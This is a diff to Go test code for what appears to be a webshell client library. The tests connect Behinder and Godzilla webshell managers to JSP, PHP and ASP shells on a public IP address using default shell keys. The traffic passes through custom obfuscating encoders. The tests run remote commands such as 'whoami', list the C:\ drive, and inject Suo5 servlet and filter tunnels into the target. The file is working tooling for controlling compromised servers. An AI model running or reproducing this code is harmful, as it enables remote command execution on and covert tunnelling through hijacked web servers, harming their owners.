@@ -83,8 +83,8 @@ func TestNewWebJSPShell_B3(t *testing.T) {
 
 	url := "http://47.120.44.219:8080/bx3.jsp"
 	testHeaders := map[string]string{
-		"xxx":  "yyy",
-		"go0p": "go0p",
+		"xxx": "yyy",
+		//"go0p": "go0p",
 	}
 	bx, _ := NewBehinderManager(url,
 		SetSecretKey("rebeyond"),
@@ -183,6 +183,48 @@ function encrypt($data){
 	t.Logf("%v", string(cmd))
 }
 
+func TestNewWebPHPShell_PPT(t *testing.T) {
+
+	url := "http://47.120.44.219/echo.php"
+	bx, _ := NewBehinderManager(url,
+		SetSecretKey("rebeyond"),
+		SetShellScript("php"),
+		SetProxy("http://127.0.0.1:9999"),
+	)
+	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
+		enc := "aaa" + string(reqBody) + "bbb"
+		return []byte(enc), nil
+	})
+	bx.EchoResultEncodeFormGo(func(reqBody []byte) ([]byte, error) {
+		classBase64Str := `
+function encrypt($data){
+    return strrev($data);
+}
+`
+		return []byte(classBase64Str), nil
+	})
+	bx.EchoResultDecodeFormGo(func(rspBody []byte) ([]byte, error) {
+		// 字符串反转
+		de := utils.StringReverse(string(rspBody))
+
+		return []byte(de), nil
+	})
+	ping, err := bx.Ping()
+	//ping, err := bx.listFile("C:/")
+	if err != nil {
+		t.Error(err)
+		return
+	}
+	t.Logf("%v", (ping))
+	//cmd, err := bx.CommandExec("whoami")
+	////ping, err := bx.listFile("C:/")
+	//if err != nil {
+	//	t.Error(err)
+	//	return
+	//}
+	//t.Logf("%v", string(cmd))
+}
+
 func TestNewWebPHPShell_B3(t *testing.T) {
 
 	url := "http://47.120.44.219/bx3.php"
@@ -218,8 +260,11 @@ func TestNewWebASPShell_B3(t *testing.T) {
 	//info, _ := bx.BasicInfo()
 	//t.Logf("%v", string(info))
 
-	cmd, _ := bx.CommandExec("whoami")
-	t.Logf("%v", string(cmd))
+	//cmd, _ := bx.CommandExec("whoami")
+	//t.Logf("%v", string(cmd))
+
+	dir, _ := bx.listFile("C:\\")
+	t.Logf("%v", string(dir))
 }
 
 func TestNewGodzillaBase64Jsp(t *testing.T) {
@@ -237,11 +282,17 @@ func TestNewGodzillaBase64Jsp(t *testing.T) {
 		panic(err)
 	}
 
-	info, err := gs.BasicInfo()
+	ping, err := gs.Ping()
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(string(info))
+	fmt.Println(ping)
+
+	//info, err := gs.BasicInfo()
+	//if err != nil {
+	//	panic(err)
+	//}
+	//fmt.Println(string(info))
 }
 
 func TestNewGodzillaRawJsp(t *testing.T) {
@@ -267,7 +318,7 @@ func TestNewGodzillaRawJsp(t *testing.T) {
 }
 
 func TestInjectSuo5Servlet(t *testing.T) {
-	url := "http://127.0.0.1:8080/bs64.jsp"
+	url := "http://47.120.44.219:8080/bs64.jsp"
 	godzillaShell, _ := NewWebShell(
 		url,
 		SetGodzillaTool(),
@@ -297,7 +348,7 @@ func TestInjectSuo5Servlet(t *testing.T) {
 }
 
 func TestInjectSuo5Filter(t *testing.T) {
-	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
+	url := "http://47.120.44.219:8080/bs64.jsp"
 	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
 	g := godzillaShell.(*Godzilla)
 
